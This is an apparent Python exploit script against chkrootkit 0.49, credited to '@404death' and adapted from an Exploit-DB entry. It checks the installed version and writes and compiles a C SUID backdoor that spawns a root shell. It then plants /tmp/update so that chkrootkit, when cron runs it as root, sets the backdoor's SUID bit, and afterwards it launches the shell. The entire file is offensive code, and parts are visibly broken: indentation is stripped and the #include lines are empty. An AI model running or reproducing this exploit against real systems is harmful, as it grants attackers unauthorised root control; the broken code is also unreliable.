#!/usr/bin/python
# @404death
# original exploit : https://www.exploit-db.com/exploits/33899/
#
import commands
import sys
import time
import os

chkrootkit = '/usr/sbin/chkrootkit'

print("[*] checking if chkrootkit is installed")
try:
if (os.path.exists(chkrootkit)) == True :
print ("[+] chkrootkit is installed ")
if (os.path.exists(chkrootkit)) == False :
print ("[-] chkrootkit isn't installed ")
except :
sys.exit("[-] chkrootkit is not installed")

print("[*] checking if chkrootkit's version is vulnerable")
sortie = (commands.getoutput("{} -V ".format(chkrootkit)))
if "0.49" in (sortie):
print("[+] chkrootkit is vulnerable")
elif not "0.49" in (sortie):
print("[-] chkrootkit is not vulnerable")
sys.exit()

print("[*] writting SUID executable ")
fichier = open("/var/tmp/suid.c","w")

#simple SUID backdoor
fichier.write("#include \n")
fichier.write("#include \n")
fichier.write("#include \n")
fichier.write("#include \n")
fichier.write("")
fichier.write("int main()\n")
fichier.write("{")
fichier.write("setuid(0);\n")
fichier.write('system("$SHELL");\n')
fichier.write("return 0;\n")
fichier.write("}\n")
fichier.close()

print("[*] compiling SUID executable")
os.system("gcc /var/tmp/suid.c -o /var/tmp/suid")
print("[*] exploit chkrootkit vulnerability ")
update = open("/tmp/update","w")
update.write("#!/bin/bash")
update.write("chown root:root /var/tmp/suid ; chmod 4755 /var/tmp/suid")
os.system("chmod +x /tmp/update")
print("")
print("")
print("[*] waiting 5 minutes before chkrootkit execute our backdoor with root permissions")
time.sleep(300)
if "-rwsr-xr-x" in (commands.getoutput("ls -lah /var/tmp/suid")) :
print("got r00t ? ")
os.system("/var/tmp/suid")
elif "-rwsr-xr-x" not in (commands.getoutput("ls -lah /var/tmp/suid")) :
print("""[-] chkrootkit wasn't executed by crontab in 5 minutes ... You need wait chkrootkit's execution by crontab then you execute /var/tmp/suid and you will get an root-shell """)
sys.exit()

